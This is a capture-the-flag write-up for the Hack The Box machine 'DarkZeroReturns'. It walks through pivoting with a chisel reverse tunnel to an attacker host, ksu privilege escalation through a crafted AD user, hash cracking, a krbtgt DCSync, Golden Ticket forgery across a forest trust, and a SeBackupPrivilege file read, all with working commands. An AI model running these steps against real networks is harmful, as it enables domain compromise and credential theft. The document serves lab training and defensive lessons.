# HTB: DarkZeroReturns

**Difficulty:** Hard (hybrid Linux/Windows environment, two AD forests with bidirectional trust)
**Target:** `10.129.39.146`
**Attacker:** `10.10.15.231` (Kali)

---

## Starting Point

Picked up mid-chain as `svc-runner` on SRV01, reached via the earlier RCE → Gitea Actions abuse chain (Handlebars AST-confusion RCE on the DarkZero Campaigns web app, followed by cracking `josh`'s hash, then abusing two Gitea CVEs to get code execution as `svc-runner` on the self-hosted Actions runner).

```
svc-runner@SRV01:~/.cache/act/.../hostexecutor$ whoami
svc-runner
```

A valid Kerberos TGT for `svc-runner@DARKZERO.EXT` was already sitting in the Gitea Actions job's environment:

```bash
klist
```
```
Ticket cache: FILE:/tmp/krb5cc_gitea
Default principal: svc-runner@DARKZERO.EXT
Valid starting       Expires              Service principal
krbtgt/DARKZERO.EXT@DARKZERO.EXT
```

Domain context confirmed from the host itself:

```bash
cat /etc/resolv.conf
# nameserver 172.16.20.2
# search darkzero.ext

realm list
# darkzero.ext, kerberos-member, sssd, active-directory
```

---

## Phase 4 — `svc-runner` → root local on SRV01 (delegated OU rights + `ksu` abuse)

### 4.1 No local AD tooling on the box

SRV01 had no `bloodyAD`, no `impacket`, not even `ldap3` for Python — only `ldapsearch`, `net`, and MIT Kerberos binaries. Rather than fight raw LDAP writes (AD refused plaintext `unicodePwd` writes, and StartTLS on this network path wasn't cooperating), the working approach was to **tunnel Kali's own `bloodyAD` install through to the internal network**, using SRV01 as the pivot.

### 4.2 Building the pivot with chisel

Chisel was already available (or pulled in via `wget` from the attacker box's HTTP server). Set up a reverse SOCKS tunnel plus a port forward to move files:

**On Kali:**
```bash
chisel server -p 8000 --reverse
```

**On SRV01:**
```bash
cd /tmp
./chisel client 10.10.15.231:8000 R:socks R:8888:127.0.0.1:8888 &
python3 -m http.server 8888 &
```

This gave Kali a SOCKS proxy on `127.0.0.1:1080` reaching into `172.16.20.0/24`, plus a way to pull files off SRV01 via `http://127.0.0.1:8888/...` (forwarded through the same tunnel).

**On Kali**, pulled the cached Kerberos ticket and confirmed proxychains routes correctly:

```bash
wget http://127.0.0.1:8888/krb5cc_gitea -O svc-runner.ccache
export KRB5CCNAME=$(pwd)/svc-runner.ccache
klist
```

`/etc/proxychains4.conf` last line set to:
```
socks5 127.0.0.1 1080
```

And `dc02.darkzero.ext` added to `/etc/hosts` (needed for correct SPN resolution during Kerberos ops):
```bash
echo "172.16.20.2 dc02.darkzero.ext" | sudo tee -a /etc/hosts
```

### 4.3 Enumeration — delegated `CREATE_CHILD` on an OU

Reachable via `ldapsearch` directly from SRV01 (native network access, no tunnel needed there):

```bash
ldapsearch -H ldap://dc02.darkzero.ext -Y GSSAPI \
  -b "DC=darkzero,DC=ext" "(objectClass=organizationalUnit)" dn
```
```
dn: OU=Domain Controllers,DC=darkzero,DC=ext
dn: OU=GiteaMigration,DC=darkzero,DC=ext
```

`svc-runner` holds delegated `CREATE_CHILD` rights on `OU=GiteaMigration` — enough to create arbitrary AD objects, including a user account, without being a privileged group member.

### 4.4 Creating a user named `root`

With `bloodyAD` now reachable from Kali via proxychains + the ticket:

```bash
proxychains -q bloodyAD --host dc02.darkzero.ext -d darkzero.ext -k \
  add user root 'P@ssw0rd123!' --ou 'OU=GiteaMigration,DC=darkzero,DC=ext'
```
```
Clock skew detected. Adjusting local time by 7:57:18.012137. Retrying operation.
[+] root created
```

The idea: an AD principal literally named `root` sets up the next step — abusing `ksu`'s default authorization fallback.

### 4.5 `ksu` privilege escalation

Back on SRV01, obtained a TGT for the new AD account:

```bash
kinit root@DARKZERO.EXT
# password: P@ssw0rd123!
```

Because `/root/.k5login` and `/root/.k5users` don't exist on SRV01, MIT Kerberos's `ksu` falls back to a simple `krb5_aname_to_localname()` comparison: if the Kerberos principal name maps to a Unix username matching the target, access is granted — no ACL file required. Since the principal is literally `root@DARKZERO.EXT`, it maps to local `root`.

```bash
ksu root -c FILE:/tmp/krb5cc_gitea << 'EOF'
whoami
id
EOF
```
```
Authenticated root@DARKZERO.EXT
Account root: authorization for root@DARKZERO.EXT successful
Changing uid to root (0)
root
uid=0(root) gid=0(root) groups=0(root)
```

**Local root on SRV01** — achieved purely through a delegated OU write right plus a default (and easy to overlook) Kerberos authorization fallback, no sudoers misconfiguration involved.

---

## Phase 5 — root local → Domain Admin of `darkzero.ext`

### 5.1 An old backup with a since-deleted row

As root, an old SQL dump was found outside the live app's usual data:

```bash
ksu root -c FILE:/tmp/krb5cc_gitea << 'EOF'
cat /root/darkzero_campaigns_backup.sql
EOF
```

The backup contained a user row no longer present in the live database:

```sql
INSERT INTO users VALUES
 (2,'celia.p@dzcampaigns.htb','celia','$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC','player','2026-04-20 17:20:14');
```

Marked `role='player'` in the web app — but this turned out to be irrelevant, since the AD account behind the same name is a real Domain Admin.

### 5.2 Cracking

```bash
hashcat -m 3200 -a 0 celia_hash.txt /usr/share/wordlists/rockyou.txt
```
Result: `babygurl13`

### 5.3 DCSync

```bash
kinit celia@DARKZERO.EXT
# password: babygurl13
klist
```

`secretsdump.py` wasn't installed on SRV01, so the ticket was transferred to Kali the same way as before (chisel-forwarded `http.server`):

```bash
# SRV01
python3 -m http.server 8888 &

# Kali
wget http://127.0.0.1:8888/krb5cc_gitea -O celia.ccache
export KRB5CCNAME=$(pwd)/celia.ccache
```

Full DRSUAPI dump was blocked by SPN target-name validation, and a real clock skew between Kali and the DC (~8 hours) caused `KRB_AP_ERR_SKEW`. Both worked around with `faketime`, targeting `krbtgt` specifically:

```bash
faketime '+8 hours' proxychains -q secretsdump.py -k -no-pass \
  darkzero.ext/celia@dc02.darkzero.ext -dc-ip 172.16.20.2 -just-dc-user krbtgt
```
```
krbtgt:aes256-cts-hmac-sha1-96:8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6
```

`darkzero.ext` is now fully compromised — the `krbtgt` key allows forging arbitrary Golden Tickets for this domain.

---

## Phase 6 — Forest trust jump: `darkzero.ext` → `darkzero.htb` → `root.txt`

### 6.1 The trick: RID-based SID filtering on an "External" trust

The forest trust between `darkzero.ext` and `darkzero.htb` is configured as **"Treat as External"**. Under this setting, SID filtering is based purely on **RID value**, not domain/forest membership:

- RID < 1000 (BUILTIN groups like `Backup Operators`, `Administrators`) → always filtered
- RID ≥ 1000 (regular domain objects) → crosses the trust intact

A regular-looking group, `InfrastructureAdministrators` (RID `1603`) in `darkzero.htb`, is nested **inside** that domain's `Backup Operators`. Since its RID is ≥ 1000, it survives the trust boundary — and the target DC expands nested membership locally, granting `Backup Operators`' privileges (including `SeBackupPrivilege`) as a side effect.

### 6.2 Forging the Golden Ticket with the bridge SID

```bash
faketime '+8 hours' ticketer.py \
  -aesKey 8daff56ad74584679edcbf648a690e3a6cd1e03b8703fb890c9b603cc3a80fe6 \
  -domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
  -domain darkzero.ext \
  -extra-sid S-1-5-21-2899195410-1848524783-1547768515-1603 \
  Administrator
```
```
[*] Saving/Updating ticket in Administrator.ccache
```

### 6.3 Crossing the trust with MIT krb5

`impacket` alone can't resolve cross-realm referrals reliably (`KDC_ERR_WRONG_REALM`). The forged ticket was moved to SRV01 (which has real network access to both DCs) via the attacker's plain HTTP server on port 80:

```bash
# SRV01
wget http://10.10.15.231/Administrator.ccache -O golden.ccache
```

A custom `krb5.conf` declaring both realms was used to let MIT Kerberos handle the referral chain properly:

```ini
[libdefaults]
    default_realm = DARKZERO.EXT
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    DARKZERO.EXT = { kdc = dc02.darkzero.ext }
    DARKZERO.HTB = { kdc = 172.16.20.1 }

[domain_realm]
    .darkzero.ext = DARKZERO.EXT
    .darkzero.htb = DARKZERO.HTB
```

```bash
export KRB5_CONFIG=/tmp/krb5_trust.conf
export KRB5CCNAME=/tmp/golden.ccache
kvno cifs/dc01.darkzero.htb@DARKZERO.HTB
klist
```

Resulting ccache correctly contained the referral TGT (`krbtgt/DARKZERO.HTB@DARKZERO.EXT`) and the final service ticket (`cifs/dc01.darkzero.htb@DARKZERO.HTB`).

### 6.4 Reading `root.txt` via `SeBackupPrivilege`

The completed ccache was pulled back to Kali (via the chisel-forwarded port), and used with impacket over the SOCKS tunnel — again with `faketime` applied to dodge clock skew against DC01:

```bash
faketime '+8 hours' proxychains -q python3 << 'EOF'
import os
os.environ['KRB5CCNAME'] = '/home/kali/darkzeroreturns/golden.ccache'
from impacket.smbconnection import SMBConnection
from impacket.smb3structs import FILE_OPEN_FOR_BACKUP_INTENT, FILE_READ_DATA, FILE_SHARE_READ, FILE_OPEN, FILE_ATTRIBUTE_NORMAL

conn = SMBConnection('dc01.darkzero.htb', '172.16.20.1', sess_port=445)
conn.kerberosLogin('Administrator', '', 'darkzero.ext', useCache=True)
tid = conn.connectTree('C$')

fid = conn.getSMBServer().create(
    tid, 'Users\\Administrator\\Desktop\\root.txt',
    FILE_READ_DATA, FILE_SHARE_READ,
    FILE_OPEN_FOR_BACKUP_INTENT, FILE_OPEN, FILE_ATTRIBUTE_NORMAL
)
print(conn.getSMBServer().read(tid, fid, 0, 1024))
EOF
```

`FILE_OPEN_FOR_BACKUP_INTENT` tells the SMB server the open is for backup purposes — if the session holds `SeBackupPrivilege` (inherited here via the nested `InfrastructureAdministrators → Backup Operators` bridge), NTFS ACL checks are bypassed entirely for read access.

**Result: `root.txt` retrieved.**

---

## Key Takeaways

1. **Delegated AD rights need auditing beyond their stated purpose.** A `CREATE_CHILD` grant meant for a CI/CD integration allowed creating *any* object, including one crafted purely to exploit Unix-side authorization logic.
2. **`ksu` without `.k5login`/`.k5users` silently falls back to name-matching authorization.** Easy to miss defensively — "no config file" does not mean "no access."
3. **"Treat as External" forest trusts filter SIDs by RID value alone**, not real namespace/forest membership. Any RID ≥ 1000 object nested inside a privileged BUILTIN group on the *far* side of the trust becomes a viable bridge.
4. **`impacket` can't be trusted to resolve cross-realm Kerberos referrals on its own** — MIT `kinit`/`kvno` handled the referral chain correctly, and impacket was only used afterward to consume the resolved ccache.
5. **Environment quirks (clock skew, missing tooling, NAT restricting reachable ports) drove most of the real friction** — the underlying attack chain itself, once understood, was a small number of clean steps.
